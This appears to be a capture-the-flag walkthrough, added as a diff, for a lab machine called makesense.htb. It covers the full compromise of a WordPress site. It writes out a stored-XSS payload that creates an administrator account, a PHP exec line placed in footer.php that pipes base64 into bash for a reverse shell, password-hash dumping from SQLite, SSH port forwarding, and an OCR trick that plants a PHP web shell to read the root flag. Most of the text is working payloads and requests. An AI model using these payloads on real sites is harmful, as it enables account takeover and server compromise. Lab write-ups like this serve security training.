@@ -1,0 +1,76 @@
+found token key in the js files
+/**
+ * Whisper Transcriber using Transformers.js
+ * Browser-based voice transcription and summarization using Hugging Face's Transformers.js library
+ */
+
+// Symmetric encryption key (must match server-side)
+const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
+
+`
+I could send an encrypted XSS payload using the action save_voice_results , the payload is encrypted using AES.MODE_GCM and the parameters are transcription and summary 
+
+another way is using action submit_contact_form , we can use the message parameter to execute stored XSS and create a new admin, and hijack the admin session, payload used - 
+
+&message=%3Cscript%3Efetch('%2Fwp-admin%2Fuser-new.php').then(r%3D%3Er.text()).then(h%3D%3E%7Blet+n%3Dh.match(%2Fname%3D%22_wpnonce_create-user%22+value%3D%22(%5Ba-f0-9%5D%2B)%22%2F)%3F.%5B1%5D%3Bif(n)%7Blet+b%3Dnew+URLSearchParams(%7Baction%3A'createuser'%2C'_wpnonce_create-user'%3An%2Cuser_login%3A'test'%2Cemail%3A'test%40test.com'%2Cpass1%3A'Testuser1!'%2Cpass2%3A'Testuser1!'%2Crole%3A'administrator'%2Ccreateuser%3A'Add+New+User'%7D)%3Bfetch('%2Fwp-admin%2Fuser-new.php'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3Ab%7D).then(r%3D%3Econsole.log('ok'%2Cr.status))%7D%7D).catch(e%3D%3Econsole.error(e))%3C%2Fscript%3E
+
+next step as the admin is to login -
+
+goto Appearance > Theme File Editor > footer.php and enter the php exec command 
+<?php exec("echo -n <REVERSE_BLOB_BASE64> | base64 -d | bash"); ?>
+
+and we have the shell www-data@makesense:/var/www/html$
+
+db found in wp-config.php
+
+// SQLite database configuration
+define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
+define( 'DB_FILE', '.ht.sqlite' );
+
+www-data@makesense:/var/www/html/wp-content/database$ sqlite3 .ht.sqlite
+
+sqlite> SELECT ID, user_login, user_pass FROM wp_users;
+1|admin|$wp$2y$10$kAvjqotf5pDs4BKKf51Toux6nYEu/mTI5Kd9mjf/XBy5BRcsR32YO
+3|walter|$wp$2y$10$RsVna8Ko6Vr3b6cA.6BRo.ROZvR0I9yodPpAPWeWxsqxdLqPImmay
+4|jake|$wp$2y$10$SigULBQTprmGuGFtHobro.A.Nz7XW4pQiR.oBH62orZGKOkmcpVMW
+5|test|$wp$2y$10$5D/T9u7MVW/O2wns5hyGMOCLsIQc9LMF7RAf951SbVvVMzQgnsVFG
+
+password cracked walter:JbhHDAEgXvri3!
+
+ran ss -tulpn , internal open port 8001
+ssh forwarded the local port using ssh walter@makesense.htb -L 8001:127.0.0.1:8001
+
+password reuse to login 
+
+after logging in I am presented with a page that does OCR on the sketch, it then saves it into a file at /content/file, to get root access I can - 
+
+create an image with system command and then send the image in base64 for it to perform the OCR and then save the file as shell.php and then run it as shell.php?cmd=cat%20/root/root.txt to get the root shell 
+
+we do that by - 
+python3 -c '
+from PIL import Image, ImageDraw, ImageFont
+img = Image.new("RGB", (700, 60), "white")
+d = ImageDraw.Draw(img)
+font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 18)
+d.text((5, 20), "<?php system($_GET[\"cmd\"]); ?>", fill="black", font=font)
+img.save("shell.png")'
+
+cat shell.png | base64 -w0
+
+POST /image/png HTTP/1.1
+Host: 127.0.0.1:8001
+Content-Type: application/x-www-form-urlencoded
+
+canvas_image=data%3Aimage%2Fpng%3Bbase64%2CiVBO...
+
+POST /image/png HTTP/1.1
+Host: 127.0.0.1:8001
+Content-Type: application/x-www-form-urlencoded
+
+ocr_id=ocr_6a4a999807c104.65391603&filename=shell.php&save_output=
+
+GET /saved/shell.php?cmd=cat%20/root/root.txt HTTP/1.1
+Host: 127.0.0.1:8001
+
+I have the root flag in the response and I have pwned the box
+	
